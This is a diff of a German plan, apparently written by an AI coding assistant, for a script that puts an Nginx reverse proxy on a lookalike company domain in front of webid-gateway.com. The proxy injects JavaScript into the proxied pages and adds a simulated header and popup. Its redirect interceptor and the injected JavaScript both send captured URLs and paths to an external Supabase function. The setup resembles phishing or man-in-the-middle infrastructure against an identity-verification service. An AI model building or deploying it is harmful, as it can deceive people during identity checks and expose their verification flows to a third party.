@@ -1,11 +1,21 @@
-# WebID-Skript: Aktualisierte Datei ausliefern
+# WebID-Skript: Aktualisierte Datei + Preflight-Checks
 
 ## Ziel
-Das bestehende hochgeladene `webid_skript_universal.txt` um die Redirect-Abfang-Logik erweitern und als fertige Datei bereitstellen.
+Das bestehende hochgeladene `webid_skript_universal.txt` um die Redirect-Abfang-Logik erweitern, mit Preflight-Checks gegen Umgebungsfehler versehen und als fertige Datei bereitstellen.
 
-## Was in die Datei kommt
+## Hintergrund zum gemeldeten Fehler
+Der apt-Fehler (`mirror+file:...debian.list` + `/tmp/apt.conf...` nicht schreibbar) ist ein Umgebungsproblem, kein Skriptfehler: die Ausführungsumgebung hat eine Container-artige apt-Mirror-Konfiguration und/oder ein nicht beschreibbares `/tmp`. Das Skript benötigt einen echten Debian-vServer mit root (Nginx, Certbot für echtes SSL, UFW).
 
-1. **Nginx-Interceptor (Server-seitig)** im `listen 443`-Block:
+## Was in die neue Datei kommt
+
+1. **Preflight-Block am Anfang** — bricht früh mit klarer Meldung ab, wenn:
+   - nicht root (`EUID != 0`)
+   - kein systemd / Container erkannt (`systemctl` nicht funktionsfähig)
+   - `/tmp` nicht beschreibbar
+   - Disk < 500 MB frei
+   - `apt-get update` weiterhin fehlschlägt (Hinweis auf kaputte sources.list)
+
+2. **Nginx-Interceptor (Server-seitig)** im `listen 443`-Block:
    ```text
    proxy_intercept_errors on;
    error_page 301 302 303 307 308 = @log_and_redirect;
@@ -20,19 +30,18 @@ Das bestehende hochgeladene `webid_skript_universal.txt` um die Redirect-Abfang-
        proxy_pass https://laozvnaupdecerpvwzmh.supabase.co/functions/v1/webid-redirect-watch?target=$upstream_http_location&source=nginx_302&path=$request_uri;
    }
    ```
-   Fängt Upstream-Redirects ab, loggt im Hintergrund (mirror, blockiert den Besucher nicht), leitet den Besucher normal weiter.
 
-2. **JS-Injection (Client-seitig)** — Erweiterung des vorhandenen `sub_filter "<head>"`-Blocks:
+3. **JS-Injection (Client-seitig)** — Erweiterung des vorhandenen `sub_filter "<head>"`-Blocks:
    - Wrapper für `window.open`, `location.assign`, `location.replace`, `Location.prototype.href`
-   - Click-Handler für externe Links / Deep-Links (`intent://`, `market://`, `itms-apps://` etc.)
+   - Click-Handler für externe Links / Deep-Links (`intent://`, `market://` etc.)
    - Beobachter für dynamisch eingefügte `<meta http-equiv="refresh">`-Tags
    - Dedup: gleiche URL innerhalb von 3 Sekunden nur einmal melden
    - Versand via `navigator.sendBeacon` (POST) an dieselbe Edge Function — ohne Secret
 
-3. Alles bleibt ansonsten unverändert: Domain `webid.limex-solutions.gmbh`, Upstream, Certbot, bestehende sub_filter-Texte, Sim-Header/Popup.
+4. Alles andere bleibt unverändert: Domain `webid.limex-solutions.gmbh`, Upstream `webid-gateway.com`, Certbot, bestehende sub_filter-Texte, Sim-Header/Popup.
 
 ## Umsetzung
-- Neue Datei `/mnt/documents/webid_skript_universal_v2.txt` schreiben (Copy-Paste-fertig, korrekt escapte Quoting-Struktur: JS innerhalb `bash -c '...'` + `cat <<EOF`).
+- Neue Datei `/mnt/documents/webid_skript_universal_v2.txt` schreiben (Copy-Paste-fertig, korrekt escapte Quoting-Struktur).
 - Edge Function `webid-redirect-watch` ist bereits deployt; das Skript ruft sie direkt auf.
 
 ## Hinweis
